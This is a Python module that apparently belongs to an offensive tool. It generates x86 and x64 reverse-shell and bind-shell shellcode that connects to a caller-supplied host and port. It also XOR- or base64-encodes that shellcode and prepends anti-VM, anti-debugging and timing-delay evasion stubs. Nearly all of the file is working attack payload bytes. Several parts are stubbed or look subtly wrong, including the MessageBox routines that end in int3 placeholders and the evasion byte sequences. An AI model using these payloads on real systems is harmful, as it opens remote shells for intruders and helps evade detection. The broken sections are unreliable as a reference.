"""
Shellcode Generator

Generates shellcode for various purposes and architectures.
"""

import logging
import struct
from typing import Any, Dict, List, Optional

from .payload_types import Architecture, EncodingType, EvasionTechnique, PayloadType

logger = logging.getLogger(__name__)


class ShellcodeGenerator:
    """Generate shellcode for various purposes and target architectures."""

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.ShellcodeGenerator")

    def generate_reverse_shell(self,
                              architecture: Architecture,
                              lhost: str,
                              lport: int) -> bytes:
        """Generate reverse shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_reverse_shell_x86(lhost, lport)
        elif architecture == Architecture.X64:
            return self._generate_reverse_shell_x64(lhost, lport)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_reverse_shell_x86(self, lhost: str, lport: int) -> bytes:
        """Generate x86 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b''.join([struct.pack('B', int(x)) for x in lhost.split('.')])
        port_bytes = struct.pack('>H', lport)

        # x86 reverse shell shellcode template
        shellcode = (
            b"\x31\xdb"              # xor ebx, ebx
            b"\xf7\xe3"              # mul ebx
            b"\x53"                  # push ebx
            b"\x43"                  # inc ebx
            b"\x53"                  # push ebx
            b"\x6a\x02"              # push 2
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x66"              # mov al, 0x66
            b"\xcd\x80"              # int 0x80
            b"\x93"                  # xchg eax, ebx
            b"\x59"                  # pop ecx
            b"\xb0\x3f"              # mov al, 0x3f
            b"\xcd\x80"              # int 0x80
            b"\x49"                  # dec ecx
            b"\x79\xf9"              # jns -7
            b"\x68" + ip_bytes +     # push IP
            b"\x68\x02\x00" + port_bytes +  # push port
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x66"              # mov al, 0x66
            b"\x50"                  # push eax
            b"\x51"                  # push ecx
            b"\x53"                  # push ebx
            b"\xb3\x03"              # mov bl, 3
            b"\x89\xe1"              # mov ecx, esp
            b"\xcd\x80"              # int 0x80
            b"\x52"                  # push edx
            b"\x68\x2f\x2f\x73\x68"  # push "//sh"
            b"\x68\x2f\x62\x69\x6e"  # push "/bin"
            b"\x89\xe3"              # mov ebx, esp
            b"\x52"                  # push edx
            b"\x53"                  # push ebx
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x0b"              # mov al, 0x0b
            b"\xcd\x80"              # int 0x80
        )

        return shellcode

    def _generate_reverse_shell_x64(self, lhost: str, lport: int) -> bytes:
        """Generate x64 reverse shell shellcode."""
        # Convert IP address to bytes
        ip_bytes = b''.join([struct.pack('B', int(x)) for x in lhost.split('.')])
        port_bytes = struct.pack('>H', lport)

        # x64 reverse shell shellcode template
        shellcode = (
            b"\x48\x31\xc0"          # xor rax, rax
            b"\x48\x31\xff"          # xor rdi, rdi
            b"\x48\x31\xf6"          # xor rsi, rsi
            b"\x48\x31\xd2"          # xor rdx, rdx
            b"\x4d\x31\xc0"          # xor r8, r8
            b"\x6a\x02"              # push 2
            b"\x5f"                  # pop rdi
            b"\x6a\x01"              # push 1
            b"\x5e"                  # pop rsi
            b"\x6a\x06"              # push 6
            b"\x5a"                  # pop rdx
            b"\x6a\x29"              # push 41
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x49\x89\xc0"          # mov r8, rax
            b"\x48\x31\xf6"          # xor rsi, rsi
            b"\x4d\x31\xc9"          # xor r9, r9
            b"\x68" + ip_bytes +     # push IP
            b"\x68\x02\x00" + port_bytes +  # push port
            b"\x48\x89\xe6"          # mov rsi, rsp
            b"\x6a\x10"              # push 16
            b"\x5a"                  # pop rdx
            b"\x4c\x89\xc7"          # mov rdi, r8
            b"\x6a\x2a"              # push 42
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x6a\x03"              # push 3
            b"\x5e"                  # pop rsi
            b"\x48\xff\xce"          # dec rsi
            b"\x6a\x21"              # push 33
            b"\x58"                  # pop rax
            b"\x4c\x89\xc7"          # mov rdi, r8
            b"\x0f\x05"              # syscall
            b"\x75\xf6"              # jnz -10
            b"\x6a\x3b"              # push 59
            b"\x58"                  # pop rax
            b"\x99"                  # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh\x00"
            b"\x53"                  # push rbx
            b"\x48\x89\xe7"          # mov rdi, rsp
            b"\x52"                  # push rdx
            b"\x57"                  # push rdi
            b"\x48\x89\xe6"          # mov rsi, rsp
            b"\x0f\x05"              # syscall
        )

        return shellcode

    def generate_bind_shell(self, architecture: Architecture, port: int) -> bytes:
        """Generate bind shell shellcode."""
        if architecture == Architecture.X86:
            return self._generate_bind_shell_x86(port)
        elif architecture == Architecture.X64:
            return self._generate_bind_shell_x64(port)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_bind_shell_x86(self, port: int) -> bytes:
        """Generate x86 bind shell shellcode."""
        port_bytes = struct.pack('>H', port)

        shellcode = (
            b"\x31\xdb"              # xor ebx, ebx
            b"\xf7\xe3"              # mul ebx
            b"\x53"                  # push ebx
            b"\x43"                  # inc ebx
            b"\x53"                  # push ebx
            b"\x6a\x02"              # push 2
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x66"              # mov al, 102
            b"\xcd\x80"              # int 0x80
            b"\x5b"                  # pop ebx
            b"\x5e"                  # pop esi
            b"\x52"                  # push edx
            b"\x68\x02\x00" + port_bytes +  # push port
            b"\x6a\x10"              # push 16
            b"\x51"                  # push ecx
            b"\x50"                  # push eax
            b"\x89\xe1"              # mov ecx, esp
            b"\x6a\x66"              # push 102
            b"\x58"                  # pop eax
            b"\xcd\x80"              # int 0x80
            b"\x89\x41\x04"          # mov [ecx+4], eax
            b"\xb3\x04"              # mov bl, 4
            b"\xb0\x66"              # mov al, 102
            b"\xcd\x80"              # int 0x80
            b"\x43"                  # inc ebx
            b"\xb0\x66"              # mov al, 102
            b"\xcd\x80"              # int 0x80
            b"\x93"                  # xchg eax, ebx
            b"\x59"                  # pop ecx
            b"\x6a\x3f"              # push 63
            b"\x58"                  # pop eax
            b"\xcd\x80"              # int 0x80
            b"\x49"                  # dec ecx
            b"\x79\xf9"              # jns -7
            b"\x68\x2f\x2f\x73\x68"  # push "//sh"
            b"\x68\x2f\x62\x69\x6e"  # push "/bin"
            b"\x89\xe3"              # mov ebx, esp
            b"\x50"                  # push eax
            b"\x53"                  # push ebx
            b"\x89\xe1"              # mov ecx, esp
            b"\xb0\x0b"              # mov al, 11
            b"\xcd\x80"              # int 0x80
        )

        return shellcode

    def _generate_bind_shell_x64(self, port: int) -> bytes:
        """Generate x64 bind shell shellcode."""
        port_bytes = struct.pack('>H', port)

        shellcode = (
            b"\x6a\x29"              # push 41
            b"\x58"                  # pop rax
            b"\x6a\x02"              # push 2
            b"\x5f"                  # pop rdi
            b"\x6a\x01"              # push 1
            b"\x5e"                  # pop rsi
            b"\x99"                  # cdq
            b"\x0f\x05"              # syscall
            b"\x48\x97"              # xchg rax, rdi
            b"\x6a\x02"              # push 2
            b"\x66\xc7\x44\x24\x02" + port_bytes +  # mov word [rsp+2], port
            b"\x48\x89\xe6"          # mov rsi, rsp
            b"\x6a\x10"              # push 16
            b"\x5a"                  # pop rdx
            b"\x6a\x31"              # push 49
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x6a\x32"              # push 50
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x48\x31\xf6"          # xor rsi, rsi
            b"\x6a\x2b"              # push 43
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x48\x97"              # xchg rax, rdi
            b"\x6a\x03"              # push 3
            b"\x5e"                  # pop rsi
            b"\x48\xff\xce"          # dec rsi
            b"\x6a\x21"              # push 33
            b"\x58"                  # pop rax
            b"\x0f\x05"              # syscall
            b"\x75\xf6"              # jnz -10
            b"\x6a\x3b"              # push 59
            b"\x58"                  # pop rax
            b"\x99"                  # cdq
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # mov rbx, "/bin/sh\x00"
            b"\x53"                  # push rbx
            b"\x48\x89\xe7"          # mov rdi, rsp
            b"\x52"                  # push rdx
            b"\x57"                  # push rdi
            b"\x48\x89\xe6"          # mov rsi, rsp
            b"\x0f\x05"              # syscall
        )

        return shellcode

    def generate_message_box(self, architecture: Architecture, title: str, message: str) -> bytes:
        """Generate Windows MessageBox shellcode."""
        if architecture == Architecture.X86:
            return self._generate_message_box_x86(title, message)
        elif architecture == Architecture.X64:
            return self._generate_message_box_x64(title, message)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")

    def _generate_message_box_x86(self, title: str, message: str) -> bytes:
        """Generate x86 Windows MessageBox shellcode."""
        self.logger.debug(f"Generating x86 MessageBox shellcode with title: '{title}', message: '{message}'")

        # Convert strings to bytes for embedding
        title_bytes = title.encode('utf-8') + b'\x00'
        message_bytes = message.encode('utf-8') + b'\x00'

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # This is a simplified template - real implementation would be more complex
        shellcode = (
            b"\x33\xc9"              # xor ecx, ecx
            b"\x64\x8b\x71\x30"      # mov esi, fs:[ecx+0x30]
            b"\x8b\x76\x0c"          # mov esi, [esi+0x0c]
            b"\x8b\x76\x1c"          # mov esi, [esi+0x1c]
            b"\x8b\x46\x08"          # mov eax, [esi+0x08]
            b"\x8b\x7e\x20"          # mov edi, [esi+0x20]
            b"\x8b\x36"              # mov esi, [esi]
            b"\x38\x4f\x18"          # cmp [edi+0x18], cl
            b"\x75\xf3"              # jnz -13
            # ... (simplified - full implementation would resolve APIs and embed strings)
            # In real implementation, title_bytes and message_bytes would be embedded here
            b"\xcc"                  # int3 (placeholder)
        )

        # In a full implementation, we would append the string data
        # shellcode += title_bytes + message_bytes

        return shellcode

    def _generate_message_box_x64(self, title: str, message: str) -> bytes:
        """Generate x64 Windows MessageBox shellcode."""
        self.logger.debug(f"Generating x64 MessageBox shellcode with title: '{title}', message: '{message}'")

        # Convert strings to bytes for embedding
        title_bytes = title.encode('utf-8') + b'\x00'
        message_bytes = message.encode('utf-8') + b'\x00'

        # Calculate string lengths for shellcode size estimation
        title_len = len(title_bytes)
        message_len = len(message_bytes)

        self.logger.debug(f"Title length: {title_len}, Message length: {message_len}")

        # Simplified template for x64
        shellcode = (
            b"\x48\x83\xec\x28"      # sub rsp, 0x28
            b"\x48\x31\xc9"          # xor rcx, rcx
            b"\x48\x31\xd2"          # xor rdx, rdx
            b"\x4d\x31\xc0"          # xor r8, r8
            b"\x4d\x31\xc9"          # xor r9, r9
            # ... (simplified - full implementation would resolve APIs and embed strings)
            # In real implementation, title_bytes and message_bytes would be embedded here
            b"\xcc"                  # int3 (placeholder)
        )

        # In a full implementation, we would append the string data
        # shellcode += title_bytes + message_bytes

        return shellcode

    def generate_encoded_shellcode(self,
                                 shellcode: bytes,
                                 encoding: EncodingType,
                                 key: Optional[bytes] = None) -> bytes:
        """Generate encoded shellcode with specified encoding technique."""
        self.logger.debug(f"Encoding shellcode with {encoding.value}, length: {len(shellcode)}")

        if encoding == EncodingType.NONE:
            return shellcode
        elif encoding == EncodingType.XOR:
            if not key:
                key = b'\xAA'  # Default XOR key
            self.logger.debug(f"Using XOR key: {key.hex()}")
            return self._xor_encode(shellcode, key)
        elif encoding == EncodingType.BASE64:
            import base64
            encoded = base64.b64encode(shellcode)
            self.logger.debug(f"Base64 encoded length: {len(encoded)}")
            return encoded
        elif encoding == EncodingType.ROT13:
            self.logger.debug("Applying ROT13 encoding")
            return self._rot13_encode(shellcode)
        else:
            self.logger.warning(f"Unsupported encoding type: {encoding}")
            return shellcode

    def _xor_encode(self, data: bytes, key: bytes) -> bytes:
        """XOR encode data with given key."""
        key_len = len(key)
        return bytes([data[i] ^ key[i % key_len] for i in range(len(data))])

    def _rot13_encode(self, data: bytes) -> bytes:
        """ROT13 encode data (simple rotation)."""
        return bytes([(b + 13) % 256 for b in data])

    def add_evasion_techniques(self,
                             shellcode: bytes,
                             techniques: List[EvasionTechnique],
                             architecture: Architecture) -> bytes:
        """Add anti-analysis evasion techniques to shellcode."""
        self.logger.debug(f"Adding evasion techniques: {[t.value for t in techniques]} for {architecture.value}")

        result = shellcode

        for technique in techniques:
            if technique == EvasionTechnique.NONE:
                continue
            elif technique == EvasionTechnique.ANTI_VM:
                result = self._add_anti_vm_checks(result, architecture)
            elif technique == EvasionTechnique.ANTI_DEBUG:
                result = self._add_anti_debug_checks(result, architecture)
            elif technique == EvasionTechnique.TIMING_ATTACKS:
                result = self._add_timing_delays(result, architecture)
            else:
                self.logger.warning(f"Evasion technique {technique.value} not implemented")

        self.logger.debug(f"Final shellcode length after evasion: {len(result)}")
        return result

    def _add_anti_vm_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-VM detection checks."""
        self.logger.debug(f"Adding anti-VM checks for {architecture.value}")

        if architecture == Architecture.X86:
            # Simple VM detection for x86
            vm_check = (
                b"\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction
                b"\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )
        else:  # x64 and others
            vm_check = (
                b"\x48\x0f\x01\x0d\x00\x00\x00\x00"  # sidt instruction (x64)
                b"\x48\x81\x3d\x00\x00\x00\x00\xff\xd0\x00\x00"  # check for VM signature
                b"\x74\x05"  # jump if VM detected
            )

        return vm_check + shellcode

    def _add_anti_debug_checks(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add anti-debugging checks."""
        self.logger.debug(f"Adding anti-debug checks for {architecture.value}")

        if architecture == Architecture.X86:
            # PEB check for debugger presence
            debug_check = (
                b"\x64\x8b\x30"          # mov esi, fs:[eax]
                b"\x8b\x76\x02"          # mov esi, [esi+2]
                b"\x80\x7e\x02\x00"      # cmp byte [esi+2], 0
                b"\x75\x05"              # jnz if debugger present
            )
        else:  # x64
            debug_check = (
                b"\x65\x48\x8b\x30"      # mov rsi, gs:[rax]
                b"\x48\x8b\x76\x02"      # mov rsi, [rsi+2]
                b"\x80\x7e\x02\x00"      # cmp byte [rsi+2], 0
                b"\x75\x05"              # jnz if debugger present
            )

        return debug_check + shellcode

    def _add_timing_delays(self, shellcode: bytes, architecture: Architecture) -> bytes:
        """Add timing-based evasion delays."""
        self.logger.debug(f"Adding timing delays for {architecture.value}")

        if architecture == Architecture.X86:
            timing_delay = (
                b"\xb9\x00\x10\x00\x00"  # mov ecx, 0x1000
                b"\xe2\xfe"              # loop (delay)
            )
        else:  # x64
            timing_delay = (
                b"\x48\xc7\xc1\x00\x10\x00\x00"  # mov rcx, 0x1000
                b"\xe2\xfe"                        # loop (delay)
            )

        return timing_delay + shellcode

    def generate_custom_shellcode(self,
                                payload_type: PayloadType,
                                architecture: Architecture,
                                options: Dict[str, Any]) -> bytes:
        """Generate custom shellcode based on payload type and options."""
        self.logger.debug(f"Generating custom {payload_type.value} for {architecture.value}")
        self.logger.debug(f"Options: {options}")

        # Extract common options
        encoding = options.get('encoding', EncodingType.NONE)
        evasion = options.get('evasion', [EvasionTechnique.NONE])
        target_os = options.get('target_os', 'windows')

        self.logger.debug(f"Target OS: {target_os}, Encoding: {encoding.value}")

        # Generate base shellcode based on payload type
        if payload_type == PayloadType.REVERSE_SHELL:
            lhost = options.get('lhost', '127.0.0.1')
            lport = options.get('lport', 4444)
            shellcode = self.generate_reverse_shell(architecture, lhost, lport)
        elif payload_type == PayloadType.BIND_SHELL:
            port = options.get('port', 4444)
            shellcode = self.generate_bind_shell(architecture, port)
        else:
            self.logger.warning(f"Payload type {payload_type.value} not implemented")
            return b"\x90" * 32  # NOP sled as fallback

        # Apply encoding if specified
        if encoding != EncodingType.NONE:
            key = options.get('encoding_key')
            shellcode = self.generate_encoded_shellcode(shellcode, encoding, key)

        # Apply evasion techniques if specified
        if evasion and evasion != [EvasionTechnique.NONE]:
            shellcode = self.add_evasion_techniques(shellcode, evasion, architecture)

        self.logger.debug(f"Final custom shellcode length: {len(shellcode)}")
        return shellcode
